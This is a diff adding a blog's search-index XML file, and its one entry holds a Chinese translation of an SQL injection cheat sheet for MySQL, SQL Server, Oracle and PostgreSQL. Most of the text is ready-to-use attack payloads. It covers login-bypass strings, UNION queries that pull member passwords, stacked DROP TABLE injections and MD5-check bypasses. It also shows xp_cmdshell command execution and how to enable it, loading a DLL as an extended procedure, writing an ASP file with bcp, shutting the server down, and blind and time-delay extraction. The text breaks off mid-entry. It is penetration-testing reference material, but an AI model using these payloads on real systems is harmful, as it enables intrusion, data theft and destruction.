@@ -1,0 +1,958 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+    
+    <entry>
+      <title><![CDATA[sql速查表]]></title>
+      <url>/2016/03/sql-cheat-sheet/</url>
+      <content type="html"><![CDATA[<html><head><br><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=8"><br><title>SQL注入速查表（cheat sheet）</title><style type="text/css" id="wiz_todo_style_id" wiz_link_version="01.00.09">.wiz-todo, .wiz-todo-img {width: 16px; height: 16px; cursor: default; padding: 0 10px 0 2px; vertical-align: -10%;-webkit-user-select: none;} .wiz-todo-label { display: inline-block; padding-top: 7px; padding-bottom: 6px; line-height: 1.5;} .wiz-todo-label-checked {  color: #666;} .wiz-todo-label-unchecked {text-decoration: initial;} .wiz-todo-completed-info {padding-left: 44px; display: inline-block; } .wiz-todo-avatar { width:20px; height: 20px; vertical-align: -20%; margin-right:10px; border-radius: 2px;} .wiz-todo-account, .wiz-todo-dt { color: #666; }</style><br><style type="text/css" id="wiz_custom_css"><br>body<br>{<br>    font-family: 微软雅黑,”Microsoft YaHei”, Georgia,Helvetica,Arial,sans-serif,宋体, PMingLiU,serif;<br>    font-size: 10.5pt;<br>    line-height: 1.5;<br>}<br>html, body<br>{<br><br><br>}<br>h1 {<br>    font-size:1.5em;<br>    font-weight:bold;<br>}<br>h2 {<br>    font-size:1.4em;<br>    font-weight:bold;<br>}<br>h3 {<br>    font-size:1.3em;<br>    font-weight:bold;<br>}<br>h4 {<br>    font-size:1.2em;<br>    font-weight:bold;<br>}<br>h5 {<br>    font-size:1.1em;<br>    font-weight:bold;<br>}<br>h6 {<br>    font-size:1.0em;<br>    font-weight:bold;<br>}<br>img {<br>    border:0;<br>    max-width: 100%;<br>    height: auto !important;<br>}<br>blockquote {<br>    margin-top:0px;<br>    margin-bottom:0px;<br>}<br>table {<br>    border-collapse:collapse;<br>    border:1px solid #bbbbbb;<br>}<br>td {<br>    border-collapse:collapse;<br>    border:1px solid #bbbbbb;<br>}<br></style><br></head><body style=""><h2>关于SQL注入速查表</h2><p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。</p><p>样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要</p><ul><li>M:    MySQL</li><li>S: SQL Server</li><li>P:    PostgreSQL</li><li>O:    Oracle</li><li>+: (大概)其他所有数据库</li></ul><p><em>例子</em>：</p><ul><li>(MS) 代表 : MySQL 和 SQL Server 等</li><li>(M<em>S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server</em></li></ul><h2>目录</h2><ol><li>关于SQL注入速查表</li><li>语法参考，攻击样例以及注入小技巧<ol><li>行间注释<ol><li>使用了行间注释的SQL注入攻击样例</li></ol></li><li>行内注释<ol><li>使用了行内注释的注入攻击样例</li><li>MySQL版本探测攻击样例</li></ol></li><li>堆叠查询(Stacking Queries)<ol><li>支持堆叠查询的语言/数据库</li><li>关于MySQL和PHP</li><li>堆叠注入攻击样例</li></ol></li><li>If语句<ol><li>MySQL的If语句</li><li>SQL Server的If语句</li><li>使用了If语句的注入攻击样例</li></ol></li><li>整数(Integers)的使用</li><li>字符串操作<ol><li>字符串的串联</li></ol></li><li>没有引号的字符串<ol><li>使用了16进制的注入攻击样例</li></ol></li><li>字符串异化(Modification)与联系</li><li>Union注入<ol><li>UNION-语言问题处理</li></ol></li><li>绕过登陆界面(SMO+)</li><li>绕过检查MD5哈希的登陆界面<ol><li>绕过MD5哈希检查的例子(MSP)</li></ol></li><li>基于错误(Error Based)-探测字段名<ol><li>使用<code>HAVING</code>来探测字段名(S)</li><li>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</li></ol></li><li>数据类型、UNION、之类的<ol><li>获取字段类型</li></ol></li><li>简单的注入(MSO+)</li><li>有用的函数、信息收集、内置程序、大量注入笔记<ol><li><code>@@version</code>(MS)</li><li>文件插入(Bulk Insert)(S)</li><li>BCP(S)</li><li>SQL Server的VBS/WSH(S)</li><li>执行系统命令，xp_cmdshell(S)</li><li>SQL Server中的一些特殊的表(S)</li><li>SQL Server的其它内置程序(S)</li><li>大量MSSQL笔记</li><li>使用LIMIT(M)或ORDER(MSO)的注入</li><li>关掉SQL Server(S)</li></ol></li><li>在SQL Server 2005中启用xp_cmdshell</li><li>探测SQL Server数据库的结构(S)<ol><li>获取用户定义表</li><li>获取字段名</li></ol></li><li>移动记录(Moving records)(S)</li><li>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</li><li>盲注<ol><li>关于盲注</li><li>实战中的盲注实例</li></ol></li><li>延时盲注<ol><li><code>WAITFOR DELAY [time]</code>(S)</li><li>实例</li><li><code>BENCHMARK()</code>(M)</li><li>实例</li><li><code>pg_sleep(seconds)</code>(P)</li></ol></li><li>掩盖痕迹<ol><li><code>-sp_password log bypass</code>(S)</li></ol></li><li>注入测试</li><li>一些其他的MySQL笔记<ol><li>MySQL中好用的函数</li></ol></li><li>SQL注入的高级使用<ol><li>强制SQL Server来得到NTLM哈希</li><li>Bulk insert UNC共享文件 (S) </li></ol></li></ol></li><li>待办事项 / 联系方式 / 帮助</li></ol><h2>语法参考，攻击样例以及注入小技巧</h2><h3>行间注释</h3><p><strong>注释掉查询语句的其余部分</strong><br>行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。</p><ul><li><p><code>–</code>(SM)</p><p><code>DROP sampletable;–</code></p></li><li><p><code>#</code>(M)</p><p><code>DROP sampletable;#</code></p></li></ul><h4>使用了行间注释的SQL注入攻击样例</h4><blockquote><p>用户名:<code>admin’–</code></p></blockquote><ul><li>构成语句:<code>SELECT  FROM members WHERE username = ‘admin’–’ AND password = ‘password’</code><br>这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。</li></ul><h3>行内注释</h3><p><strong>通过不关闭注释注释掉查询语句的其余部分</strong>，或者用于<strong>绕过过滤</strong>，移除空格，混淆，或探测数据库版本。</p><ul><li><code>/<em>注释内容</em>/</code>(SM)<ul><li><code>DROP/<em>comment</em>/sampletable</code></li><li><code>DR/<strong>/OP/<em>绕过过滤</em>/sampletable</strong></code></li><li><code>SELECT/<em>替换空格</em>/password//FROM/<strong>/Members</strong></code></li></ul></li><li><p><code>/<em>! MYSQL专属 </em>/</code> (M) </p><p>这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。<br><code>SELECT /<em>!32302 1/0, </em>/ 1 FROM tablename</code></p></li></ul><h4>使用了行内注释的注入攻击样例</h4><blockquote><p>ID:<code>10; DROP TABLE members /<em></em></code></p></blockquote><p>简单地摆脱了处理后续语句的麻烦，同样你可以使用<code>10; DROP TABLE members –</code></p><h4>MySQL版本探测攻击样例</h4><blockquote><p><code>SELECT /!32302 1/0, <em>/ 1 FROM tablename</em></code></p></blockquote><p>如果MySQL的版本高于<strong>3.23.02</strong>，会抛出一个<code>division by 0 error</code></p><blockquote><p>ID:<code>/!32302 10<em>/</em></code></p><p>ID:<code>10</code></p></blockquote><p>如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果</p><h3>堆叠查询(Stacking Queries)</h3><p><strong>一句代码之中执行多个查询语句</strong>，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p><ul><li><code>;</code>(S)<br>    <code>SELECT  FROM members; DROP members–</code><br>    结束一个查询并开始一个新的查询</li></ul><h4>支持堆叠查询的语言/数据库</h4><p><strong>绿色：</strong>支持，<strong>暗灰色：</strong>不支持，<strong>浅灰色：</strong>未知<br><img alt="支持堆叠查询的语言/数据库" src="/2016/03/sql-cheat-sheet/SQL注入速查表（cheat sheet）_files/d74e34ff-e528-4102-b95f-acb512912b70.jpg"></p><h4>关于MySQL和PHP</h4><p>阐明一些问题。</p><p><strong>PHP-MySQL不支持堆叠查询</strong>，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？</p><p><em>（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）</em></p><h4>堆叠注入攻击样例</h4><blockquote><p>ID:<code>10;DROP members –</code></p></blockquote><p>构成语句：<code>SELECT <em> FROM products WHERE id = 10; DROP members–</em></code></p><p>这在执行完正常查询之后将会执行DROP查询。</p><h3>If语句</h3><p>根据If语句得到响应。这是<strong>盲注(Blind SQL Injection)的关键之一</strong>，同样也能简单而<strong>准确地</strong>进行一些测试。</p><h4>MySQL的If语句</h4><ul><li><p><code>IF(condition,true-part,false-part)</code>(M)</p><blockquote><p><code>SELECT IF (1=1,’true’,’false’)</code></p></blockquote></li></ul><h4>SQL Server的If语句</h4><ul><li><p><code>IF condition true-part ELSE false-part</code>(S)</p><blockquote><p><code>IF (1=1) SELECT ‘true’ ELSE SELECT ‘false’</code></p></blockquote></li></ul><h4>使用了If语句的注入攻击样例</h4><blockquote><p><code>if ((select user) = ‘sa’ OR (select user) = ‘dbo’) select 1 else select 1/0</code>(S)</p></blockquote><p>如果当前用户不是<strong>“sa”或者”dbo”</strong>,就会抛出一个<strong><code>divide by zero error</code></strong>。</p><h3>整数(Integers)的使用</h3><p>对于绕过十分有用，比如<strong>magic_quotes() 和其他类似过滤器</strong>，甚至是各种WAF。</p><ul><li><p><code>0xHEXNUMBER</code>(SM)</p><p>(HEXNUMBER:16进制数）<br>你能这样使用16进制数：</p><ul><li><p><code>SELECT CHAR(0x66)</code>(S)</p></li><li><p><code>SELECT 0x5045</code>(M) (这不是一个整数，而会是一个16进制字符串）</p></li><li><p><code>SELECT 0x50 + 0x45</code>(M) (现在这是整数了)</p></li></ul></li></ul><h3>字符串操作</h3><p>与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。</p><h4>字符串的串联</h4><ul><li><p><code>+</code>(S)</p><p><code>SELECT login + ‘-‘ + password FROM members</code></p></li><li><p><code>||</code> (MO) </p><p><code>SELECT login || ‘-‘ || password FROM members</code></p></li></ul><p><strong><em>关于MySQL的”||”</em></strong><br>这个仅在ANSI模式下的MySQL执行，其他情况下都会当成’逻辑操作符’并返回一个0。更好的做法是使用<code>CONCAT()</code>函数。</p><ul><li><p><code>CONCAT(str1, str2, str3, …)</code>(M)</p><p>连接参数里的所有字符串<br>例：<code>SELECT CONCAT(login, password) FROM members</code></p></li></ul><h3>没有引号的字符串</h3><p>有很多使用字符串的方法，但是这几个方法是一直可用的。使用<code>CHAR()</code>(MS)和<code>CONCAT()</code>(M)来生成没有引号的字符串</p><ul><li><p><code>0x457578</code> (M) - 16进制编码的字符串</p><p><code>SELECT 0x457578</code></p><p>这在MySQL中会被当做字符串处理</p></li><li><p>在MySQL中使用16进制字符串的一个简单方式：<br><code>SELECT CONCAT(‘0x’,HEX(‘c:\boot.ini’))</code></p></li><li><p>在MySQL中使用<code>CONCAT()</code>函数：<br><code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code> (M) </p><p>这会返回’KLM’</p></li><li><p><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code> (S) </p><p>这会返回’KLM’</p></li></ul><h4>使用了16进制的注入攻击样例</h4><ul><li><p><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</code> (M) </p><p>这会显示<strong>c:\boot.ini</strong>的内容</p></li></ul><h3>字符串异化(Modification)与联系</h3><ul><li><p><code>ASCII()</code> (SMP) </p><p>返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。</p><p>例：<code>SELECT ASCII(‘a’)</code></p></li><li><p><code>CHAR()</code> (SM) </p><p>把整数转换为对应ASCII码的字符</p><p>例：<code>SELECT CHAR(64)</code></p></li></ul><h3>Union注入</h3><p>通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。<br><code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members</code></p><p>这会把news表和members表的内容合并返回。</p><p>另一个例子：<br><code>‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</code></p><h4>UNION-语言问题处理</h4><p>当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。</p><ul><li><p>使用 <code>COLLATE SQL_Latin1_General_Cp1254_CS_AS</code>(S)</p><p>或者其它的什么语句，具体的自己去查SQL Server的文档。<br>例：<code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code></p></li><li><p><code>Hex()</code>(M)</p><p>百试百灵~</p></li></ul><h3>绕过登陆界面(SMO+)</h3><p><em>SQL注入101式</em>(大概是原文名字吧？),登陆小技巧</p><ul><li><code>admin’ –</code></li><li><code>admin’ #</code></li><li><code>admin’/</code></li><li><code>‘ or 1=1–</code></li><li><code>‘ or 1=1#</code></li><li><code>‘ or 1=1/<em></em></code></li><li><code>‘) or ‘1’=’1–</code></li><li><code>‘) or (‘1’=’1–</code></li><li>….</li><li>以不同的用户登陆 (SM)<br>    <code>‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</code></li></ul><p>*<em>旧版本的MySQL不支持union</em></p><h3>绕过检查MD5哈希的登陆界面</h3><p>如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p><h4>绕过MD5哈希检查的例子(MSP)</h4><blockquote><p>用户名：<code>admin</code></p><p>密码：<code>1234 ‘ AND 1=0 UNION ALL SELECT ‘admin’,’81dc9bdb52d04dc20036dbd8313ed055</code></p></blockquote><p>其中<code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</code></p><h3>基于错误(Error Based)-探测字段名</h3><h4>使用<code>HAVING</code>来探测字段名(S)</h4><ul><li><code>‘ HAVING 1=1 –</code></li><li><code>‘ GROUP BY table.columnfromerror1 HAVING 1=1 –</code></li><li><code>‘ GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 –</code></li><li>……</li><li><code>‘ GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 –</code></li><li>直到它不再报错，就算搞定了</li></ul><h4>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</h4><p>通过ORDER BY来探测字段数能够加快union注入的速度。</p><ul><li><code>ORDER BY 1–</code></li><li><code>ORDER BY 2–</code></li><li>……</li><li><code>ORDER BY N–</code> </li><li>一直到它报错为止，最后一个成功的数字就是字段数。</li></ul><h3>数据类型、UNION、之类的</h3><p><strong>提示：</strong></p><ul><li>经常给<strong>UNION</strong>配上<strong>ALL</strong>使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</li><li>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用<code>-1</code>或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</li><li>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强<ul><li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</li></ul></li></ul><h4>获取字段类型</h4><ul><li><p><code>‘ union select sum(columntofind) from users–</code> (S) </p><pre><code>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’<br>[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar<em>* data type as an argument.<br></em></code></pre><p>如果没有返回错误说明字段是<strong>数字类型</strong><br>+ 同样的，你可以使用<code>CAST()</code>和<code>CONVERT()</code><br>+   <code>SELECT  FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL–</code><br>+ <code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。<br>+ <code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 – 第一个字段是<code>integer</code>类型。<br>+ <code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 –</code></p><p>报错 – 第二个字段不是<code>integer</code>类型</p></li><li><p><code>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 – 第二个字段是<code>string</code>类型。</p></li><li><p><code>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</code></p><p>报错 – 第三个字段不是<code>integer</code> </p></li><li><p>……</p><pre><code>Microsoft OLE DB Provider for SQL Server error ‘80040e07’<br>Explicit conversion from data type int to image is not allowed.<br></code></pre></li></ul><p><strong>你在遇到union错误之前会先遇到convert()错误</strong>，所以先使用convert()再用union</p><h3>简单的注入(MSO+)</h3><p><code>‘; insert into users values( 1, ‘hax0r’, ‘coolpass’, 9 )/<em></em></code></p><h3>有用的函数、信息收集、内置程序、大量注入笔记</h3><h4><code>@@version</code>(MS)</h4><p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</p><p><code>INSERT INTO members(id, user, pass) VALUES(1, ‘’+SUBSTRING(@@version,1,10) ,10)</code></p><h4>文件插入(Bulk Insert)(S)</h4><p>把文件内容插入到表中。如果你不知道应用目录你可以去<strong>读取IIS metabase file</strong>(<em>仅IIS 6</em>)(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>)然后在里面找到应用目录。</p><ol><li>新建一个表foo(<code>line varchar(8000)</code>)</li><li><code>BULK INSERT foo FROM ‘c:\inetpub\wwwroot\login.asp’</code></li><li>DROP了临时表，重复另一个文件</li></ol><h4>BCP(S)</h4><p>写入文件。这个功能需要登录<br><code>bcp “SELECT  FROM test..foo” queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</code></p><h4>SQL Server的VBS/WSH(S)</h4><p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSH</p><pre><code>declare @o int<br>exec sp_oacreate ‘wscript.shell’, @o out<br>exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’<br></code></pre><blockquote><p>Username: <code>‘; declare @o int exec sp_oacreate ‘wscript.shell’, @o out exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’ –</code></p></blockquote><h4>执行系统命令，xp_cmdshell(S)</h4><p>众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限</p><p><code>EXEC master.dbo.xp_cmdshell ‘cmd.exe dir c:’</code></p><p>用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。</p><p><code>EXEC master.dbo.xp_cmdshell ‘ping ‘</code></p><p>如果有错误，或者union或者其他的什么，你都不能直接读到结果。</p><h4>SQL Server中的一些特殊的表(S)</h4><ul><li><p>Error Messages</p><p><code>master..sysmessages</code><br>+ Linked Servers </p><p><code>master..sysservers</code></p></li><li><p>Password (2000和2005版本的都能被破解，这俩的加密算法很相似) </p><p>SQL Server 2000: masters..sysxlogins </p><p>SQL Server 2005 : sys.sql_logins </p></li></ul><h4>SQL Server的其它内置程序(S)</h4><ol><li><p>命令执行 (xp_cmdshell) </p><p><code>exec master..xp_cmdshell ‘dir’</code></p></li><li><p>注册表操作 (xp_regread)</p><ol><li>xp_regaddmultistring</li><li>xp_regdeletekey</li><li>xp_regdeletevalue</li><li>xp_regenumkeys</li><li>xp_regenumvalues</li><li>xp_regread</li><li>xp_regremovemultistring</li><li>xp_regwrite <pre><code>exec xp_regread HKEY_LOCAL_MACHINE, ‘SYSTEM\CurrentControlSet       \Services\lanmanserver\parameters’, ‘nullsessionshares’<br>exec xp_regenumvalues HKEY_LOCAL_MACHINE, ‘SYSTEM       \CurrentControlSet  \Services\snmp\parameters\validcommunities’<br></code></pre></li></ol></li><li><p>管理服务(xp_servicecontrol)</p></li><li>媒体(xp_availablemedia)</li><li>ODBC 资源 (xp_enumdsn)</li><li>登录 (xp_loginconfig)</li><li>创建Cab文件 (xp_makecab)</li><li>域名列举 (xp_ntsec_enumdomains)</li><li>杀进程 (need PID) (xp_terminate_process)</li><li><p>新建进程 (<em>实际上你想干嘛都行</em>) </p><pre><code>sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’<br>exec xp_webserver<br></code></pre></li><li><p>写文件进UNC或者内部路径 (sp_makewebtask)</p></li></ol><h4>大量MSSQL笔记</h4><p><code>SELECT <em> FROM master..sysprocesses /</em>WHERE spid=@@SPID<em>/</em></code></p><p><code>DECLARE @result int; EXEC @result = xp_cmdshell ‘dir .exe’;IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p><p>HOST_NAME()<br>IS_MEMBER (Transact-SQL)<br><br>IS_SRVROLEMEMBER (Transact-SQL)<br><br>OPENDATASOURCE (Transact-SQL)</p><p><code>INSERT tbl EXEC master..xp_cmdshell OSQL /Q”DBCC SHOWCONTIG”</code></p><p>OPENROWSET (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx" target="_blank" rel="external">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p><p>你不能在 SQL Server 的Insert查询里使用子查询(sub select).</p><h4>使用LIMIT(M)或ORDER(MSO)的注入</h4><p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,’x’/<em>,10 ;</em></code></p><p>如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。</p><h4>关掉SQL Server(S)</h4><p>如果你真的急了眼，<code>‘;shutdown –</code></p><h3>在SQL Server 2005中启用xp_cmdshell</h3><p>默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。</p><pre><code>EXEC sp_configure ‘show advanced options’,1<br>RECONFIGURE<br><br>EXEC sp_configure ‘xp_cmdshell’,1<br>RECONFIGURE<br></code></pre><h3>探测SQL Server数据库的结构(S)</h3><h4>获取用户定义表</h4><p><code>SELECT name FROM sysobjects WHERE xtype = ‘U’</code></p><h4>获取字段名</h4><p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = ‘tablenameforcolumnnames’)</code></p><h3>移动记录(Moving records)(S)</h3><ul><li><p>修改WHERE，使用<strong>NOT IN</strong>或者<strong>NOT EXIST</strong><code>… WHERE users NOT IN (‘First User’, ‘Second User’)</code><code>SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code> – 这个好用</p></li><li><p>脏的不行的小技巧</p><p><code>SELECT  FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int</code></p><p><code>Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype=’U’ and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = ‘U’) as p where p.x=21</code></p></li></ul><h3>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</h3><p><code>‘;BEGIN DECLARE @rt varchar(8000) SET @rd=’:’ SELECT @rd=@rd+’ ‘+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = ‘MEMBERS’) AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;–</code></p><p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/" target="_blank" rel="external">Fast way to extract data from Error Based SQL Injections</a></strong></p><h3>盲注</h3><h4>关于盲注</h4><p>一个经过完整而优秀开发的应用一般来说你是<strong>看不到错误提示的</strong>，所以你是没办法从Union攻击和错误中提取出数据的</p><p><strong>一般盲注</strong>，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果</p><p><strong>完全盲注</strong>，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。</p><p>在一般盲注下你能够使用<strong>If语句</strong>或者<strong>WHERE查询注入<strong><em>(一般来说比较简单)</em>，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用</strong>WAIT FOR DELAY ‘0:0:10’</strong>，在MySQL中使用<strong>BENCHMARK()</strong>，在PostgreSQL中使用<strong>pg_sleep(10)</strong>，以及在ORACLE中的一些<strong>PL/SQL小技巧</strong>。</p><h4>实战中的盲注实例</h4><p>以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。</p><p><strong>TRUE</strong>和<strong>FALSE</strong>标志代表了查询返回了true或false</p><pre><code>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78–<br><br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;103–<br><br>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;89–<br><br>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;83–<br><br>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;80–<br><br>FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<br></code></pre><p>由于上面<strong>后两个查询都是false</strong>，我们能清楚的知道表名的第一个<strong>字符的ASCII码是80，也就是”P”</strong>。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。</p><h3>延时盲注</h3><p>首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。</p><h4><code>WAITFOR DELAY [time]</code>(S)</h4><p>这就跟<code>sleep</code>差不多，等待特定的时间。通过CPU来让数据库进行等待。</p><p><code>WAITFOR DELAY ‘0:0:10’–</code></p><p>你也可以这样用</p><p><code>WAITFOR DELAY ‘0:0:0.51’</code></p><h4>实例</h4><ul><li>俺是sa吗？<br>    <code>if (select user) = ‘sa’ waitfor delay ‘0:0:10’</code></li><li>ProductID =<code>1;waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1);waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1’;waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1’);waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1));waitfor delay ‘0:0:10’–</code></li><li>ProductID =<code>1’));waitfor delay ‘0:0:10’–</code></li></ul><h4><code>BENCHMARK()</code>(M)</h4><p>一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。<br><code>BENCHMARK(howmanytimes, do this)</code></p><h4>实例</h4><ul><li><p>俺是root吗？爽！<br>    <code>IF EXISTS (SELECT <em> FROM users WHERE username = ‘root’) BENCHMARK(1000000000,MD5(1))</em></code></p></li><li><p>判断表是否存在<br>    <code>IF (SELECT  FROM login) BENCHMARK(1000000,MD5(1))</code></p></li></ul><h4><code>pg_sleep(seconds)</code>(P)</h4><p>睡眠指定秒数。</p><ul><li><code>SELECT 